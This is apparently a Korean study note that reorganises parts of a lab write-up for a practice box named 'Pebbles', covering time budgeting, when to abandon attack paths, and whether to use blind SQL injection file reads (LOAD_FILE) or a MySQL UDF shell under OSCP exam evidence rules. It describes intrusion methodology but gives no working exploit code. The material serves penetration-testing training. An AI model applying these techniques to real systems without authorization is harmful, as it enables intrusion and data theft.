**부수 증상 — 셸을 안 잡으면 뒤늦게 잡기가 더 어려움.** [[Pebbles]] 는 플래그 확보(10:25) 뒤 32분이 지나서야 SSH 키쌍을 만들었고(`peb_key`·`peb_key.pub` 10:57), 다시 12분 뒤 작성한 재침투 스크립트(`pebbles_pwn.sh` 11:09)의 첫 줄이 `# One-shot re-exploit for Pebbles once the box is back up.` 임 — **그 시점에 박스가 이미 정지돼 있었음.** 셸은 끝내 못 잡았음. 「일단 값은 얻었으니」로 미루면 슬롯이 먼저 닫힘.

**원문 (박스 노트 4-1 · 5장 · 7-7 · 삭제 전)**

```text
(4-1) 왜 UDF를 안 쓰고 끝냈나 — 판단 근거
필요한 산출물이 `proof.txt` 하나였고, 그건 `LOAD_FILE` 한 번으로 읽힌다. UDF는 (a) `.so` 컴파일/아키텍처 정합, (b) `plugin_dir` 위치 확인, (c) `INTO DUMPFILE` 권한 등 실패 지점이 많다. **목표가 파일 하나면 blind 읽기가 더 빠르고 확실**하다. 시험에서도 "셸이 목적인지, 특정 파일이 목적인지"를 먼저 정하고 최단 경로를 고른다.

(5장) > [!warning] 시험 증거 형식 연습
> 실제 시험이라면 셸을 잡아 `whoami; hostname; ip a; cat proof.txt`를 **한 화면**에 담아야 인정된다. 이 박스는 셸 없이 DB로 파일을 읽어 플래그를 얻었으므로, 시험 상황이었다면 **UDF로 셸을 마저 잡아 증거샷을 찍어야** 점수가 된다. "플래그 값을 아는 것"과 "시험 규격 증거"는 다르다.

(7-7) **목표가 파일 하나면 셸을 만들지 마라.** `LOAD_FILE`로 읽는 게 UDF보다 빠르고 실패 지점이 적다. 단, **시험 증거는 셸+한화면 스샷**이 필요하니 "점수용 셸"과 "정보 획득"을 구분한다.
```

---

## 10. D. 시간 배분 · 손절 기준 — **병합**

**넣을 본문**

**[[Pebbles]] 손절 판단 (실측 타임라인 09:54 정찰 → 10:25 플래그 = 31분)**

| 대상 | 언제 접는가 |
|---|---|
| 8080 「Tomcat」 | `/manager/html`·`/index.jsp` 가 404 인 것을 본 순간. 여기서 10분 이상 쓰면 함정에 빠진 것 |
| FTP · SSH | 익명 530 + 버전이 무해(`vsftpd 3.0.3` ≠ 백도어 2.3.4)를 확인하면 즉시 웹으로. **웹에 명백한 진입점이 있으면 신호가 강한 쪽부터 팜** |
| MySQL UDF | 플래그가 파일 하나면 아예 시작하지 않음 — 단 **시험이면 점수를 위해 결국 필요함**(C-3) |
| blind 추출이 안 붙을 때 | 30분을 넘기지 말 것. 코드가 아니라 **타이밍/컨텍스트**가 원인일 때가 많음 |
| blind 로 «긴 파일» 읽기 | 문자당 요청이 7회라 수백 바이트면 수십 분. 5분 안에 끝날 분량이 아니면 대상을 잘라 조각만 가져올 것(A 절 5번) |

**원문 (박스 노트 6-7 · 7장 시간 배분 · 삭제 전)**

```text
### 6-7. FTP·SSH에서 시간 쓰지 않기

`vsftpd 3.0.3`을 보고 백도어(2.3.4)를 떠올려 시간을 쓸 수 있는데, 버전이 다르다. 익명 로그인도 530으로 거부됐다. `OpenSSH 7.2p2`도 사용자명 열거 CVE(CVE-2016-6210)가 있지만 크리덴셜이 없으면 소득이 적다. **웹(`/zm/`)에 명백한 진입점이 있으므로 FTP/SSH는 빠르게 접는 게 맞다.** 신호가 강한 쪽부터 판다.

(7장) 시간 배분 — 어디서 손절했어야 하나
- **8080 Tomcat 파기**: `/manager/html` 404 + `/hello.php` 소스 노출을 본 순간 접는다. 여기서 10분 이상 쓰면 함정에 빠진 것.
- **FTP/SSH**: 익명 530 + 버전 무해를 확인하면 즉시 접고 웹으로.
- **UDF 시도**: 플래그가 파일 하나면 아예 시작하지 않는다.
- **SQLi 추출이 안 붙으면**: 30분 넘기지 말고 임계값·주석문자·컨텍스트를 재점검. 코드가 아니라 타이밍/컨텍스트가 원인일 때가 많다.
```

---

## 이관 검산

| | 건수 |
|---|---|
| 박스 노트에서 제거된 학습 자료 장 | **6개** — `0. 배우는 것` · `6. 막혔던 지점`(6-1~6-7 = 7항목) · `7. OSCP 시험 관점`(7항목 + 시간배분) · `8. 방어 관점`(→ 각 finding `Vulnerability Fix:` 로 분산, 이관 아님) |
| 이 파일의 제안 | **10건** (병합 6 · 신규 4) |
| 원문 인용 | **10건 전부** 「원문」 블록으로 보존 |

**분산 처리(이관 아님)**
- `8. 방어 관점` 표 8행 → `Initial Access` / `Privilege Escalation` 의 `Vulnerability Fix:` 로 흡수. 「미끼 8080 / 오픈 프록시 배너」·「디렉터리 리스팅 활성」·「구버전 스택(Ubuntu 16.04, ZM 1.29.0)」 세 행은 finding 과 직접 연결되지 않아 **노트에서 빠졌음** — 필요하면 별도 판단 요망
- `9. 참고 자료` · `남긴 흔적` → `## 관련` · `Post-Exploitation`
- `5. 플래그` 표 → `Local.txt value:`(없음+근거) · `Proof.txt value:`
